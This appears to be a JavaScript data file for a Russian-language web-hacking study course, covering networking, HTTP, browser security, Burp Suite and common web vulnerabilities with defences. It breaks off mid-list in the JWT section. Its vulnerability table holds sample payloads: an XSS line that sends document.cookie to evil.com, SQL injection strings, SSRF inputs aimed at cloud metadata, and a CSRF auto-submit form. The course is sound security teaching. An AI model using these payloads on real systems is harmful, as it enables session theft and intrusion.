window.ACADEMY_DATA = window.ACADEMY_DATA || {};

window.ACADEMY_DATA.phase3a = {
  id: "phase3a",
  title: "🌐📡 Фаза 3 (Ч.1): Сети, HTTP, DNS, TLS и Видео 1–2",
  badge: "Недели 1–4 • L3 AppSec",
  html: `
    <div class="hero-banner">
      <div class="hero-badge-row">
        <span class="badge badge-amber">📡 TCP/IP, DNS, Порты, Рукопожатие</span>
        <span class="badge badge-cyan">🌐 HTTP, Методы, Заголовки, Статусы, Куки</span>
        <span class="badge badge-purple">🎬 Полный разбор Видео №1 и №2 + Главы 1 и 3</span>
      </div>
      <h1 class="hero-title">Фаза 3 (Часть 1) — Как устроены Сети, Интернет, HTTP и API до винтика</h1>
      <p class="hero-desc">
        Любая нейросеть (ChatGPT, Claude, корпоративный RAG-бот) упакована внутрь обычного веб-сервера и REST API. Чтобы уметь атаковать и защищать веб и ИИ, ты должен видеть весь путь сетевого пакета насквозь.
      </p>
    </div>

    <div class="diagram-card">
      <img src="../05-Assets/network_path.svg" alt="Полный путь сетевого пакета" onclick="openLightbox(this.src)">
      <div class="diagram-caption">🔍 Нажми на схему, чтобы увеличить: Полный путь пакета от нажатия кнопки в браузере до сервера и обратно.</div>
    </div>

    <h2 class="section-heading">📦 1. Принцип «Матрёшки» (Инкапсуляция), IP-адреса, Порты и TCP vs UDP</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">🏢 Аналогия: Многоквартирный дом (IP vs Порт vs Протокол)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия из жизни: Курьерская доставка в бизнес-центр</div>
          • <strong>IP-адрес (Сетевой уровень, например <code class="inline-code">142.250.74.14</code>)</strong> — это <strong>точный адрес здания</strong> (город, улица, дом). По нему роутеры везут пакет через континенты.<br>
          • <strong>Порт (Транспортный уровень, число от <code class="inline-code">0</code> до <code class="inline-code">65535</code>)</strong> — это <strong>номер кабинета (двери)</strong> внутри здания! На одном сервере одновременно работают сайт, база данных, почта, терминал SSH и локальная нейросеть. Порт говорит серверу, в какую именно дверь отдать письмо.<br>
          • <strong>Прикладной протокол (<code class="inline-code">HTTP</code>, <code class="inline-code">SSH</code>, <code class="inline-code">DNS</code>)</strong> — это <strong>язык, на котором написан документ</strong> внутри конверта.
        </div>
        <div class="table-wrap">
          <table class="cyber-table">
            <thead><tr><th>Порт</th><th>Служба</th><th>Зачем знать хакеру и защитнику</th></tr></thead>
            <tbody>
              <tr><td><code class="inline-code">80</code> / <code class="inline-code">443</code></td><td><strong>HTTP / HTTPS</strong></td><td>Веб-сайты и почти все публичные AI API (<code class="inline-code">443</code> зашифрован TLS).</td></tr>
              <tr><td><code class="inline-code">22</code></td><td><strong>SSH</strong></td><td>Удалённый вход в терминал Linux (главная дверь администратора).</td></tr>
              <tr><td><code class="inline-code">53</code></td><td><strong>DNS</strong></td><td>Перевод доменных имён в IP-адреса (обычно UDP).</td></tr>
              <tr><td><code class="inline-code">3306</code> / <code class="inline-code">5432</code> / <code class="inline-code">6379</code></td><td><strong>MySQL / Postgres / Redis</strong></td><td>Базы данных. Если они торчат наружу в интернет — это критический мисконфиг!</td></tr>
              <tr><td><code class="inline-code">3000</code>, <code class="inline-code">8000</code>, <code class="inline-code">8080</code></td><td><strong>Dev / Proxy</strong></td><td>Тестовые серверы разработчиков и локальный прокси Burp Suite (<code class="inline-code">8080</code>).</td></tr>
              <tr><td><code class="inline-code">11434</code></td><td><strong>Ollama API</strong></td><td>Порт локальной LLM по умолчанию!</td></tr>
            </tbody>
          </table>
        </div>
      </div>

      <div class="card">
        <div class="card-title">🤝 TCP vs UDP и Трёхстороннее рукопожатие (3-Way Handshake)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Заказное письмо с описью (TCP) vs Бросок мяча через забор (UDP)</div>
          • <strong>TCP</strong> сначала звонит в дверь и убеждается, что получатель дома, нумерует каждую страницу и требует переслать заново, если листок потерялся. На TCP работают <code class="inline-code">HTTP/S</code>, <code class="inline-code">SSH</code>, базы данных.<br>
          • <strong>UDP</strong> просто швыряет пакеты через забор без звонка: быстро, без задержек, но если один кадр видеозвонка или онлайн-игры улетел в кусты — никто его не пересылает.
        </div>
        <div class="code-wrap">
          <div class="code-header"><span>Трёхстороннее рукопожатие TCP (3-Way Handshake)</span></div>
          <pre class="code-block">[Твой ПК (Клиент)]                              [Сервер]
        | --- 1. SYN («Привет, ты открыт?») ----------> |
        | <-- 2. SYN-ACK («Открыт, слышу! А ты?») ----- |
        | --- 3. ACK («Отлично, начинаем разговор!») -> |
        |     ===== Соединение установлено =====        |</pre>
        </div>
        <div class="red-box">
          <strong>🔴 Как это использует Хакер (Nmap Stealth Scan <code class="inline-code">nmap -sS</code>):</strong><br>
          Сканер отправляет только шаг №1 (<code class="inline-code">SYN</code>). Если порт закрыт — сервер шлёт отказ (<code class="inline-code">RST</code>). Если открыт — сервер отвечает шагом №2 (<code class="inline-code">SYN-ACK</code>). Хакер тут же записывает «Порт открыт!» и вместо <code class="inline-code">ACK</code> обрывает связь (<code class="inline-code">RST</code>).
        </div>
        <div class="blue-box">
          <strong>🛡️ Как защищается Сисадмин от SYN Flood DDoS:</strong><br>
          Когда атакующий шлёт миллион <code class="inline-code">SYN</code> с поддельных IP и не отвечает <code class="inline-code">ACK</code>, очередь полуоткрытых соединений забивает память. Защита — включение механизма <strong><code class="inline-code">SYN Cookies</code></strong> в ядре Linux (<code class="inline-code">net.ipv4.tcp_syncookies = 1</code>).
        </div>
      </div>
    </div>

    <h2 class="section-heading">📖 2. DNS, HTTP vs HTTPS, Методы, Заголовки и Статус-коды</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">☎️ DNS (Телефонная книга интернета) и Subdomain Takeover</div>
        <p>Люди пишут <code class="inline-code">chatgpt.com</code>, а сетевые карты понимают только цифры IP (<code class="inline-code">104.18.32.7</code>). <strong>DNS</strong> переводит имя в IP.</p>
        <ul style="margin-left:18px; margin-top:6px; font-size:0.9rem;">
          <li><strong><code class="inline-code">A</code> / <code class="inline-code">AAAA</code></strong> — связывает домен напрямую с IPv4 / IPv6 адресом.</li>
          <li><strong><code class="inline-code">CNAME</code></strong> — перенаправление домена на другое имя (например, <code class="inline-code">ai.company.com → company-bot.azurewebsites.net</code>).</li>
          <li><strong><code class="inline-code">TXT</code></strong> — текстовые записи (проверки владения доменом, настройки почты SPF/DKIM).</li>
        </ul>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия для Subdomain Takeover: Забытый указатель на шоссе</div>
          Компания арендовала павильон в торговом центре Azure и поставила на главном шоссе официальный указатель (<code class="inline-code">CNAME promo.company.com</code>). Через год компания съехала из павильона, но <strong>забыла убрать свой указатель с шоссе</strong>! Хакер арендует этот же пустующий павильон в Azure под тем же именем — и теперь все клиенты, идущие по официальному указателю <code class="inline-code">promo.company.com</code>, попадают прямо в руки хакера!
        </div>
      </div>

      <div class="card">
        <div class="card-title">✉️ HTTP (Открытка) vs 🔒 HTTPS (Бронированный кейс TLS)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Почтовая открытка vs Инкассаторский сейф</div>
          • По <strong>HTTP (порт 80)</strong> твой логин, пароль и промпт летят по Wi-Fi в кофейне как <strong>обычная бумажная открытка без конверта</strong>: любой сосед по Wi-Fi (атака <em>Man-in-the-Middle</em>) может прочитать или дописать туда свою строчку.<br>
          • <strong>HTTPS (порт 443)</strong> упаковывает тот же самый HTTP-текст внутрь криптографического сейфа <strong>TLS</strong>. Он даёт 3 гарантии: <strong>Шифрование</strong> (внутри Wi-Fi видна только каша из байтов), <strong>Целостность</strong> (нельзя незаметно подменить букву) и <strong>Подлинность</strong> (сертификат подтверждает, что это настоящий сервер банка).
        </div>
        <div class="diagram-card">
          <img src="../Images pasted/Pasted image 20261108231725.png" alt="Конспект Accept и Connection" onclick="openLightbox(this.src)">
          <div class="diagram-caption">Твоя памятка по заголовкам <code>Accept</code> и <code>Connection</code> (нажми для увеличения).</div>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">📬 Все HTTP-методы и Статус-коды (Таблица Разведчика)</div>
      <div class="grid-2">
        <div>
          <h4 style="margin-bottom:8px; color:var(--accent-cyan);">HTTP-методы (Глаголы действия)</h4>
          <ul style="margin-left:18px; font-size:0.89rem;">
            <li><strong><code class="inline-code">GET</code></strong> — «Покажи страницу/данные». Параметры видны в URL (<code class="inline-code">?id=5</code>). <em>Никогда не передавай пароли и ключи в GET — они оседают в логах и истории браузера!</em></li>
            <li><strong><code class="inline-code">POST</code></strong> — «Прими данные в теле запроса и создай/выполни» (вход в аккаунт, отправка промпта в LLM).</li>
            <li><strong><code class="inline-code">PUT</code> / <code class="inline-code">PATCH</code></strong> — «Замени объект целиком» / «Измени отдельные поля» (проверяй на <em>Mass Assignment</em>: допиши <code class="inline-code">"role":"admin"</code>!).</li>
            <li><strong><code class="inline-code">DELETE</code></strong> — «Удали объект».</li>
            <li><strong><code class="inline-code">HEAD</code></strong> — «Пришли только заголовки ответа без тела» (быстрая разведка).</li>
            <li><strong><code class="inline-code">OPTIONS</code></strong> — «Какие методы разрешены?» (используется в CORS Preflight).</li>
          </ul>
        </div>
        <div>
          <h4 style="margin-bottom:8px; color:var(--accent-emerald);">Главные коды ответа сервера</h4>
          <ul style="margin-left:18px; font-size:0.89rem;">
            <li><strong><code class="inline-code">101 Switching Protocols</code></strong> — переход на живой поток <strong>WebSockets</strong> (чаты и стриминг ИИ).</li>
            <li><strong><code class="inline-code">200 OK</code> / <code class="inline-code">201 Created</code></strong> — Успех!</li>
            <li><strong><code class="inline-code">301</code> / <code class="inline-code">302 Redirect</code></strong> — Перенаправление в заголовке <code class="inline-code">Location</code>. <em>В Burp Suite проверяй тело ответа 302: иногда сервер шлёт редирект на <code class="inline-code">/login</code>, но забывает остановить код и присылает секретную админку в теле!</em></li>
            <li><strong><code class="inline-code">400 Bad Request</code></strong> — сломан синтаксис (например, лишняя запятая в JSON).</li>
            <li><strong><code class="inline-code">401 Unauthorized</code></strong> — «Я не знаю, кто ты (не вошёл в систему)».</li>
            <li><strong><code class="inline-code">403 Forbidden</code></strong> — «Я знаю, кто ты, но тебе сюда нельзя!» (Значит, папка реально существует!).</li>
            <li><strong><code class="inline-code">429 Too Many Requests</code></strong> — сработал лимит запросов (Rate Limiting).</li>
            <li><strong><code class="inline-code">500 Internal Server Error</code></strong> — <strong>главный маяк для хакера!</strong> Твой ввод (кавычка <code class="inline-code">'</code> или спецсимвол) сломал код бэкенда.</li>
          </ul>
        </div>
      </div>
    </div>

    <h2 class="section-heading">🔗 3. Полная анатомия URL (7 частей), Форматы тела (Content-Type) и Кодирование vs Хэширование vs Шифрование</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">🧬 7 частей URL и хитрость якоря <code class="inline-code">#</code></div>
        <div class="code-wrap">
          <div class="code-header"><span>Разбор URL по косточкам</span></div>
          <pre class="code-block">https://admin:pass@shop.site.com:8443/api/v2/items?cat=books#reviews
\___/   \________/ \___________/ \__/ \__________/ \_______/ \_____/
  1         2            3         4        5          6        7</pre>
        </div>
        <p style="font-size:0.88rem;">
          <strong>1. Scheme</strong> (<code class="inline-code">https://</code>) • <strong>2. UserInfo</strong> (<code class="inline-code">admin:pass@</code> — трюк фишеров: ссылка <code class="inline-code">https://google.com@evil.com</code> ведёт на <code class="inline-code">evil.com</code>!) • <strong>3. Host</strong> • <strong>4. Port</strong> • <strong>5. Path</strong> • <strong>6. Query</strong> (<code class="inline-code">?cat=books</code> — улетает на сервер) • <strong>7. Fragment / Hash (<code class="inline-code">#reviews</code>) — НИКОГДА не отправляется на сервер!</strong> Он остаётся только в браузере и читается через <code class="inline-code">location.hash</code> (отсюда скрытые атаки DOM XSS!).
        </p>
      </div>

      <div class="card">
        <div class="card-title">🔐 Кодирование ≠ Хэширование ≠ Шифрование (Не путай никогда!)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Азбука Морзе vs Фарш в мясорубке vs Сейф с ключом</div>
          • <strong>Кодирование (<code class="inline-code">Base64</code>, <code class="inline-code">URL-encode</code>, <code class="inline-code">Hex</code>) — это перевод слова на азбуку Морзе.</strong> Секрета тут ноль: любой человек за секунду переведёт обратно (<code class="inline-code">echo "c2VjcmV0" | base64 -d</code>).<br>
          • <strong>Хэширование (<code class="inline-code">SHA-256</code>, <code class="inline-code">bcrypt</code>, <code class="inline-code">Argon2</code>) — это мясорубка.</strong> Из куска мяса (пароля) получается котлета (хэш фиксированной длины). Провернуть фарш назад и получить корову <strong>невозможно математически</strong>! Можно только брать другие куски мяса (словарь паролей) и крутить их через ту же мясорубку, пока фарш не совпадёт.<br>
          • <strong>Шифрование (<code class="inline-code">AES</code>, <code class="inline-code">RSA</code>, <code class="inline-code">TLS</code>) — это сейф с ключом.</strong> Кто знает секретный ключ — открывает и достаёт исходный документ.
        </div>
      </div>
    </div>

    <h2 class="section-heading">🎬 4. Конспект двух базовых видео «КАК Я СТАЛ ХАКЕРОМ» + Курсы по Сетям</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">📺 Видео 1 и 2 по таймкодам</div>
        <p><strong>1. <a class="res-link" href="https://www.youtube.com/watch?v=255Pv3Z9gj4" target="_blank">Основы Веб-Хакинга | Часть 1</a>:</strong></p>
        <ul style="margin-left:18px; font-size:0.86rem; margin-bottom:10px;">
          <li><code class="inline-code">00:00</code> Главная ошибка новичков (заучивание пейлоадов без понимания логики)</li>
          <li><code class="inline-code">01:07–03:14</code> Сетевой (IP), Транспортный (TCP/UDP, порты) и Прикладной уровни</li>
          <li><code class="inline-code">05:04</code> Установка соединения: TCP 3-Way Handshake (<code class="inline-code">SYN, SYN-ACK, ACK</code>)</li>
          <li><code class="inline-code">07:19</code> Клиент vs Сервер (почему сервер никогда не должен доверять клиенту!)</li>
          <li><code class="inline-code">10:49–13:11</code> Методы HTTP, статус-коды и заголовки запросов/ответов</li>
          <li><code class="inline-code">13:48–14:38</code> Почему HTTP уязвим к перехвату и как спасает HTTPS</li>
        </ul>
        <p><strong>2. <a class="res-link" href="https://youtu.be/j7O6Uqy6ZJY" target="_blank">WEB HACKING BASICS | Часть 2</a>:</strong></p>
        <ul style="margin-left:18px; font-size:0.86rem;">
          <li><code class="inline-code">01:51</code> DNS и поиск забытых поддоменов</li>
          <li><code class="inline-code">02:39–06:08</code> Как работают браузеры (DOM) и 3 столпа защиты: SOP, CORS, CSP</li>
          <li><code class="inline-code">07:00–09:53</code> Веб-приложения, REST API и формат JSON</li>
          <li><code class="inline-code">10:37</code> Аутентификация vs Авторизация vs Сессии (Cookies и JWT)</li>
          <li><code class="inline-code">12:47</code> Почему HTTP-прокси (Burp Suite) — главное оружие исследователя</li>
          <li><code class="inline-code">15:47</code> 4 главных полигона: PortSwigger, DVWA, OWASP Juice Shop, bWAPP</li>
        </ul>
      </div>

      <div class="card">
        <div class="card-title">🎓 Бесплатные курсы по Сетям и ИБ + Практика в Wireshark и Nmap</div>
        <ul style="margin-left:18px; font-size:0.88rem;">
          <li>📚 <strong>Professor Messer — CompTIA Network+ (N10-009, 100% бесплатно):</strong> <a class="res-link" href="https://www.professormesser.com/free-netplus/n10-009/n10-009-video/" target="_blank">Смотреть курс</a></li>
          <li>📚 <strong>Professor Messer — CompTIA Security+ (SY0-701, 100% бесплатно):</strong> <a class="res-link" href="https://www.professormesser.com/security-plus/sy0-701/" target="_blank">Смотреть курс</a></li>
          <li>🎬 Наглядные ролики NetworkChuck: <a class="res-link" href="https://www.youtube.com/watch?v=S7MNX_UD7vY" target="_blank">What is a network?</a> • <a class="res-link" href="https://www.youtube.com/watch?v=5WfiTHiU4x8" target="_blank">IP Addresses</a> • <a class="res-link" href="https://www.youtube.com/watch?v=s_gy0_ceFvQ" target="_blank">Subnetting</a> • <a class="res-link" href="https://www.youtube.com/watch?v=27r4Bzuj5NQ" target="_blank">DNS</a> • <a class="res-link" href="https://www.youtube.com/watch?v=4t4kBkMsDbQ" target="_blank">Nmap Tutorial</a></li>
          <li>🎬 <a class="res-link" href="https://www.youtube.com/watch?v=tkADnNpJ2gk" target="_blank">John Hammond — Wireshark Tutorial</a></li>
          <li>📖 Книга №1 по сетям: <strong>Kurose &amp; Ross — Computer Networking: A Top-Down Approach</strong> (Главы 1–3).</li>
        </ul>
        <div class="code-wrap">
          <div class="code-header"><span>Главные боевые команды Nmap (на своей учебной VM/Docker)</span><button class="copy-btn" onclick="copyCode(this)">Копировать</button></div>
          <pre class="code-block">sudo nmap -sS 127.0.0.1           # Быстрое полуоткрытое SYN-сканирование
nmap -sC -sV -p 3000,8080 127.0.0.1 # Определить версии программ (-sV) и запустить скрипты (-sC)
sudo nmap -p- -T4 127.0.0.1       # Проверить абсолютно все 65535 портов (-p-)</pre>
        </div>
      </div>
    </div>
  `
};

window.ACADEMY_DATA.phase3b = {
  id: "phase3b",
  title: "🏴‍☠️🕸️ Фаза 3 (Ч.2): Браузеры, Burp, OWASP, JWT и Разведка",
  badge: "Недели 5–10 • Полная Энциклопедия Главы 2–10",
  html: `
    <div class="hero-banner">
      <div class="hero-badge-row">
        <span class="badge badge-rose">🔥 Полная Энциклопедия Веб-Хакинга (Главы 2, 4–10)</span>
        <span class="badge badge-amber">🛡️ SOP, CORS, CSP, JWT, Sources &amp; Sinks</span>
        <span class="badge badge-emerald">🧪 5 полных разборов лаб + Защищённый код</span>
      </div>
      <h1 class="hero-title">Фаза 3 (Часть 2) — Браузеры, Burp Suite, Взлом и Защита Веба/API (Главы 2–10)</h1>
      <p class="hero-desc">
        Здесь целиком, без единого сокращения, встроена твоя настольная энциклопедия веб-хакинга со всеми схемами, пейлоадами, горячими клавишами Burp Suite, разведкой через <code class="inline-code">ffuf</code>/<code class="inline-code">nuclei</code> и примерами исправления уязвимого кода на бэкенде.
      </p>
    </div>

    <div class="diagram-card">
      <img src="../05-Assets/web_hacking_roadmap_9_steps.jpg" alt="9 шагов веб-хакинга" onclick="openLightbox(this.src)">
      <div class="diagram-caption">🗺️ Карта 9 фундаментальных шагов веб-хакинга (нажми для увеличения).</div>
    </div>

    <h2 class="section-heading">🛡️ ГЛАВА 2. Три столпа безопасности браузера: SOP, CORS, CSP и Хранилища</h2>
    <div class="diagram-card">
      <img src="../05-Assets/browser_security_3_pillars.svg" alt="SOP CORS CSP" onclick="openLightbox(this.src)">
      <div class="diagram-caption">Три защитных механизма браузера: SOP (стена между сайтами), CORS (дверь по пропуску) и CSP (фейсконтроль скриптов).</div>
    </div>

    <div class="grid-3">
      <div class="card">
        <div class="card-title">1. SOP (Same-Origin Policy)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Звуконепроницаемые стены в отеле</div>
          В соседних вкладках открыты твой Банк и сайт с фильмами. <strong>SOP</strong> — это бетонная стена между номерами: скрипт с сайта фильмов <strong>не имеет права заглянуть в соседний номер и прочитать страницу банка</strong>! «Один источник» (<code class="inline-code">Origin</code>) = совпали все три части: <strong>Протокол + Домен + Порт</strong> (<code class="inline-code">https://mybank.com:443</code>).<br>
          <em>Нюанс:</em> SOP запрещает <strong>читать</strong> чужой ответ, но не всегда запрещает <strong>отправить</strong> запрос вслепую — поэтому возможна атака <strong>CSRF</strong>!
        </div>
      </div>

      <div class="card">
        <div class="card-title">2. CORS (Cross-Origin Resource Sharing)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Официальный пропуск между корпусами компании</div>
          Если фронтенд живёт на <code class="inline-code">app.company.com</code>, а API — на <code class="inline-code">api.company.com</code>, это разные Origin! Чтобы браузер разрешил чтение, сервер присылает заголовок <code class="inline-code">Access-Control-Allow-Origin: https://app.company.com</code>.<br>
          <strong>🔥 Как ломают (Reflected Origin):</strong> если сервер лениво копирует любой присланный <code class="inline-code">Origin: https://evil.com</code> в ответ вместе с <code class="inline-code">Access-Control-Allow-Credentials: true</code> — сайт хакера читает переписку жертвы!
        </div>
      </div>

      <div class="card">
        <div class="card-title">3. CSP (Content Security Policy)</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Строгий охранник со списком гостей на входе</div>
          Даже если хакер смог внедрить кусок <code class="inline-code">&lt;script&gt;</code> в комментарий (XSS), заголовок <strong>CSP</strong> (<code class="inline-code">script-src 'self'</code>) приказывает браузеру: <em>«Запускай код только из официальных файлов нашего домена, а любые самодельные вставки в HTML блокируй!»</em>. (Ослабляется, если программист оставил <code class="inline-code">'unsafe-inline'</code> или <code class="inline-code">'unsafe-eval'</code>).
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">🗄️ Где браузер хранит данные (F12 → Application): Cookies vs LocalStorage vs SessionStorage</div>
      <div class="table-wrap" style="margin:0;">
        <table class="cyber-table">
          <thead><tr><th>Хранилище</th><th>Улетает на сервер само?</th><th>Доступно из JavaScript?</th><th>Защита при XSS-атаке</th></tr></thead>
          <tbody>
            <tr><td><strong>1. Cookies</strong></td><td>✅ Да, с каждым запросом</td><td>❌ <strong>Нет</strong>, если стоит флаг <code class="inline-code">HttpOnly</code>!</td><td>🛡️ Флаг <code class="inline-code">HttpOnly</code> спасает сессию от чтения через <code class="inline-code">document.cookie</code>.</td></tr>
            <tr><td><strong>2. LocalStorage</strong></td><td>❌ Нет (только кодом JS)</td><td>✅ <strong>Всегда доступно!</strong></td><td>🔴 Критично: любой XSS одной строчкой <code class="inline-code">localStorage.getItem('token')</code> крадёт JWT!</td></tr>
            <tr><td><strong>3. SessionStorage</strong></td><td>❌ Нет</td><td>✅ <strong>Всегда доступно!</strong></td><td>🔴 Живёт до закрытия вкладки, полностью доступно для XSS.</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <h2 class="section-heading">🕵️ ГЛАВА 4. Burp Suite — Твоя машина времени для HTTP-пакетов</h2>
    <div class="diagram-card">
      <img src="../05-Assets/burp_suite_architecture.svg" alt="Архитектура Burp Suite" onclick="openLightbox(this.src)">
      <div class="diagram-caption">Как Burp Suite перехватывает трафик между браузером и сервером (Proxy, Repeater, Intruder).</div>
    </div>

    <div class="grid-2">
      <div class="card">
        <div class="card-title">🎛️ Главные вкладки и 4 режима атаки Intruder</div>
        <ul style="margin-left:18px; font-size:0.9rem;">
          <li><strong><code class="inline-code">Proxy → HTTP History</code>:</strong> тихо записывает все запросы сайта. Начинай анализ любой цели именно отсюда!</li>
          <li><strong><code class="inline-code">Repeater (Ctrl + R)</code>:</strong> ручная лаборатория, где ты меняешь параметры, заголовки и JSON-поля и жмёшь <code class="inline-code">Send (Ctrl + Space)</code> хоть 100 раз подряд.</li>
          <li><strong><code class="inline-code">Intruder (Ctrl + I)</code>:</strong> автоматическая подстановка словарей в точки <code class="inline-code">§...§</code>:
            <ul style="margin-left:18px; margin-top:4px;">
              <li><strong>Sniper:</strong> 1 словарь, по очереди проверяет каждую точку <code class="inline-code">§</code>.</li>
              <li><strong>Battering Ram:</strong> 1 словарь, ставит одно и то же слово во все <code class="inline-code">§</code> сразу.</li>
              <li><strong>Pitchfork:</strong> 2+ словаря синхронно построчно (<code class="inline-code">user1:pass1</code>).</li>
              <li><strong>Cluster Bomb:</strong> перебор всех комбинаций «каждый с каждым».</li>
            </ul>
          </li>
        </ul>
      </div>

      <div class="card">
        <div class="card-title">🔌 Топ-5 расширений BApp Store и Горячие клавиши</div>
        <ol style="margin-left:18px; font-size:0.9rem;">
          <li><strong>Autorize:</strong> автоматический поиск IDOR! Ходишь под админом, а плагин сам повторяет запросы с кукой обычного юзера.</li>
          <li><strong>JWT Editor:</strong> редактирование, подпись и атаки <code class="inline-code">alg: none</code> прямо в Repeater.</li>
          <li><strong>Param Miner:</strong> поиск скрытых параметров (<code class="inline-code">?debug=1</code>).</li>
          <li><strong>Logger++:</strong> полный лог всех запросов и ответов.</li>
          <li><strong>Turbo Intruder:</strong> отправка тысяч запросов в секунду и ловля <em>Race Conditions</em>.</li>
        </ol>
        <div style="margin-top:10px; font-size:0.84rem; color:var(--text-secondary);">
          <strong>Горячие клавиши:</strong> <code class="inline-code">Ctrl+R</code> (в Repeater) • <code class="inline-code">Ctrl+I</code> (в Intruder) • <code class="inline-code">Ctrl+U</code> / <code class="inline-code">Ctrl+Shift+U</code> (URL-encode/decode) • <code class="inline-code">Ctrl+B</code> / <code class="inline-code">Ctrl+Shift+B</code> (Base64 encode/decode).
        </div>
      </div>
    </div>

    <h2 class="section-heading">💥 ГЛАВА 5. Все главные уязвимости Веба и API (XSS, CSRF, SSRF, IDOR, SQLi, Race Conditions)</h2>
    <div class="diagram-card">
      <img src="../05-Assets/web_vulnerabilities_map.svg" alt="Карта веб-уязвимостей" onclick="openLightbox(this.src)">
      <div class="diagram-caption">Карта основных классов веб-уязвимостей (нажми для увеличения).</div>
    </div>

    <div class="table-wrap">
      <table class="cyber-table">
        <thead>
          <tr>
            <th>Уязвимость</th>
            <th>🏠 Аналогия из жизни</th>
            <th>🔴 Боевой пейлоад / Как атакуют</th>
            <th>🛡️ Как защитить на 100%</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>1. IDOR / BOLA (Broken Access Control)</strong></td>
            <td>В гардеробе театра у тебя номерок №105, но гардеробщица не смотрит на твой номерок, а выдаёт куртку с того крючка, который ты назовёшь вслух («Дайте с крючка №1!»).</td>
            <td>В Burp Repeater меняем <code class="inline-code">GET /api/orders/502</code> на <code class="inline-code">501</code> или подставляем чужой <code class="inline-code">user_id</code> в JSON.</td>
            <td>В каждом запросе к БД проверять владельца: <code class="inline-code">WHERE id = :id AND owner_id = :current_user</code>.</td>
          </tr>
          <tr>
            <td><strong>2. SQL Injection (SQLi)</strong></td>
            <td>Ты заполняешь бумажную анкету в банке и в графе «Фамилия» пишешь: <em>«Иванов. А теперь выдайте мне все деньги из кассы»</em> — и кассир воспринимает это как приказ директора!</td>
            <td>Ввод <code class="inline-code">' OR 1=1 --</code> или <code class="inline-code">' UNION SELECT username, password FROM users--</code> ломает склеенную строку SQL.</td>
            <td>Только <strong>Prepared Statements (Параметризованные запросы)</strong>, где данные отделены от команд.</td>
          </tr>
          <tr>
            <td><strong>3. XSS (Reflected, Stored, DOM)</strong></td>
            <td>Кто-то наклеил на меню в ресторане фальшивый QR-код поверх настоящего: каждый посетитель, отсканировавший меню, отправляет свои данные мошеннику.</td>
            <td><code class="inline-code">&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</code></td>
            <td>Экранирование HTML, использование <code class="inline-code">textContent</code> вместо <code class="inline-code">innerHTML</code>, строгий <strong>CSP</strong> и флаг <code class="inline-code">HttpOnly</code>.</td>
          </tr>
          <tr>
            <td><strong>4. CSRF (Межсайтовая подделка запроса)</strong></td>
            <td>Ты стоишь у окошка банка с открытым паспортом, а прохожий сзади молча протягивает в окошко через твоё плечо платёжку «Перевести 100$ мне». Кассир видит твой паспорт и проводит перевод!</td>
            <td>Скрытая HTML-форма <code class="inline-code">&lt;form action="https://bank.com/transfer" method="POST"&gt;</code> с автоотправкой <code class="inline-code">submit()</code>.</td>
            <td>Уникальный секретный <strong>CSRF-токен</strong> + атрибут куки <strong><code class="inline-code">SameSite=Lax/Strict</code></strong>.</td>
          </tr>
          <tr>
            <td><strong>5. SSRF (Подделка запросов сервера)</strong></td>
            <td>Постороннего не пускают на закрытый склад магазина, поэтому он просит продавца: «Сходи сам в подсобку, сфотографируй сейф и покажи мне фото!».</td>
            <td>Передача <code class="inline-code">url=http://127.0.0.1/admin</code>, обход <code class="inline-code">http://127.1/%2561dmin</code> или кража ключей облака AWS <code class="inline-code">http://169.254.169.254/latest/meta-data/</code>.</td>
            <td>Белый список разрешённых внешних доменов и жёсткий запрет внутренних IP-диапазонов.</td>
          </tr>
          <tr>
            <td><strong>6. Race Condition (Состояние гонки)</strong></td>
            <td>Два человека одновременно в одну миллисекунду снимают последние 100$ с одной карты в двух соседних банкоматах, пока база не успела обновить остаток.</td>
            <td>Отправка 20 одинаковых запросов на применение промокода одной пачкой в Burp Repeater (<code class="inline-code">Send group in parallel</code>).</td>
            <td>Транзакционные блокировки в БД (<code class="inline-code">SELECT ... FOR UPDATE</code>) и атомарные операции.</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 class="section-heading">📜 ГЛАВА 6 и 7. Анализ JavaScript (Sources &amp; Sinks) и 5 Атак на JWT-токены</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">🔎 Источники (Sources) и Стоки (Sinks) в JavaScript</div>
        <p>Открыв сайт, нажми <code class="inline-code">F12 → Sources → Ctrl+Shift+F</code> и ищи, где данные из адреса страницы попадают в опасные функции:</p>
        <div class="code-wrap">
          <div class="code-header"><span>Главные пары Source → Sink для поиска DOM XSS</span></div>
          <pre class="code-block"># 📥 SOURCES (Откуда хакер подаёт ввод):
window.location.search   // параметры после ?
window.location.hash     // якорь после # (не летит на сервер!)
window.addEventListener("message", ...) // приём postMessage

# 💥 SINKS (Куда ввод не должен попадать без очистки):
element.innerHTML = ...          // выполняет HTML/JS! (Замени на .textContent)
document.write(...)              // выполняет HTML/JS!
eval(...) / setTimeout("str")    // выполняет чистый JS!
element.href = returnUrl         // уязвимо к javascript:alert(1)!</pre>
        </div>
      </div>

      <div class="card">
        <div class="card-title">🪪 Анатомия JWT и 5 способов его взлома</div>
        <div class="analogy-box">
          <div class="analogy-header">🏠 Аналогия: Прозрачный пластиковый бейдж с сургучной печатью</div>
          <strong>JWT (<code class="inline-code">Header.Payload.Signature</code>) НЕ зашифрован!</strong> Первые две части — это просто текст в Base64, который читается кем угодно (как бейдж в прозрачном кармашке). Защищает его только третья часть — <strong>криптографическая печать сервера</strong>.
        </div>
        <ol style="margin-left:18px; font-size:0.88rem;">
